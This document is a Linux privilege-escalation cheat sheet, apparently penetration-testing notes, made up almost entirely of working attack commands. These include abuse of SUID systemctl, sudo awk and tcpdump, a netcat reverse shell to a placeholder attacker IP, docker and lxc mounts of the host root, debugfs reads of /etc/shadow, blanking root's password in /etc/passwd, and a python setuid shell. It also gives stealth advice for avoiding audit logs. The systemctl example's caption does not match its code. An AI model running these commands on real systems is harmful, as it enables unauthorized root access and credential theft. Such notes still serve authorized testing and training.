# Special Permissions (SUID / SGID)
**Concept:** The `setuid` (SUID) bit allows a user to execute a binary with the permissions of the file's owner (usually root). If the binary allows shell escapes or arbitrary code execution, it leads to immediate privilege escalation. 
**Indicator:** Permissions display an `s` (e.g., `-rwsr-xr-x`).
## 1. Enumeration
**Goal:** Locate all binaries with SUID/SGID bits set owned by root.
```shell
# Description: Find SUID/SGID files owned by root, discarding errors.
# Syntax: find <Path> -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -4000 -type f 2>/dev/null
```
## 2. Exploitation (GTFObins)
**Goal:** Abuse the binary's functionality to spawn a shell or read sensitive files. 
**Reference:** Always cross-reference results with [GTFObins](https://gtfobins.github.io).

**Example: Systemctl SUID** If `systemctl` has SUID, we can create a service to run a reverse shell.
```shell
# Description: Create a service link to execute a reverse shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
**OPSEC Warning:** Searching the entire filesystem (`find /`) generates high disk I/O and audit logs. Target specific directories (`/usr/bin`, `/opt`) if stealth is required.
# Sudo Rights Abuse
**Concept:** The `/etc/sudoers` file controls which commands users can run as other users (often root). Misconfigurations include `NOPASSWD` directives or allowing binaries that facilitate shell escapes.
## 1. Enumeration
**Goal:** List allowed commands for the current user.
```shell
# Description: List sudo capabilities. Requires user password unless NOPASSWD is set.
# Syntax: sudo -l
sudo -l
```
## 2. Exploitation: Shell Escape
If a binary like `vim`, `less`, `awk`, or `find` is allowed as root, you can break out to a shell.
**Example: Awk**
```shell
# Description: Spawn a root shell using awk
sudo awk 'BEGIN {system("/bin/sh")}'
```
## 3. Exploitation: Logic Abuse (Tcpdump)
Sometimes the binary doesn't allow a direct shell, but its features can be abused to execute code. 
**Scenario:** `sudo /usr/sbin/tcpdump` is allowed. 
**Technique:** Use the `postrotate-command` (`-z`) to execute a script.
```shell
# 1. Create a reverse shell script
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f' > /tmp/shell.sh
chmod +x /tmp/shell.sh

# 2. Trigger via tcpdump
# -z: Command to run after rotation
# -W 1 -G 1: Rotate capture file every 1 second
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root
```
# Privileged Groups
**Concept:** Membership in specific groups can be equivalent to root access. These are often overlooked as they don't require `sudo`.
## 1. Docker Group
**Risk:** Users in the `docker` group can communicate with the Docker daemon (running as root). 
**Exploit:** Mount the host's root directory (`/`) into a new container, giving full R/W access to the host filesystem.
```shell
# Description: Run a container, mounting host root to /mnt/root
# Syntax: docker run -v /:/mnt/root -it <Image> chroot /mnt/root sh
docker run -v /:/mnt/root -it alpine chroot /mnt/root sh
```
- **Post-Exploitation:** Once inside, you can edit `/etc/shadow` or add SSH keys to `/root/.ssh/`.
## 2. LXD / LXC Group
**Risk:** Similar to Docker, LXD allows management of system containers. 
**Exploit:** Create a privileged container mounting the host filesystem.
```shell
# 1. Initialize (Select defaults)
lxd init

# 2. Import valid image (e.g., Alpine)
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# 3. Create privileged container
lxc init alpine priv-container -c security.privileged=true

# 4. Mount Host Path
lxc config device add priv-container host-root disk source=/ path=/mnt/root recursive=true

# 5. Execute Shell
lxc start priv-container
lxc exec priv-container /bin/sh
# Access host files at /mnt/root
```
## 3. Disk Group
**Risk:** Users in the `disk` group have raw access to block devices (e.g., `/dev/sda1`). 
**Exploit:** Use `debugfs` to read/write directly to the drive, bypassing OS file permissions.
```shell
# Description: Read /etc/shadow directly from the block device
debugfs /dev/sda1
debugfs: cat /etc/shadow
```
# Linux Capabilities
**Concept:** Capabilities break down the binary "root" privilege into granular permissions (e.g., `CAP_NET_BIND_SERVICE` allows binding low ports). 
**Critical Capabilities:**
- `CAP_SETUID`: Allows a process to change its UID (become root).
- `CAP_DAC_OVERRIDE`: Bypasses file read/write/execute permission checks.
## 1. Enumeration
**Goal:** Find binaries with unusual capabilities set.
```shell
# Description: Recursively list capabilities of files
# Syntax: getcap -r <Path> 2>/dev/null
getcap -r /usr/bin 2>/dev/null
```
## 2. Exploitation: CAP_DAC_OVERRIDE (Vim)
**Scenario:** `/usr/bin/vim.basic` has `cap_dac_override=eip`. 
**Impact:** You can edit _any_ file on the system, including `/etc/passwd`.
```shell
# 1. Edit /etc/passwd non-interactively
# Removes the 'x' (password placeholder) from root, allowing passwordless login.
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# 2. Elevate
su root
```
## 3. Exploitation: CAP_SETUID (Python)
**Scenario:** `/usr/bin/python3` has `cap_setuid=ep`. 
**Impact:** Trivial privilege escalation.
```shell
# Description: Set UID to 0 (root) and spawn shell
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```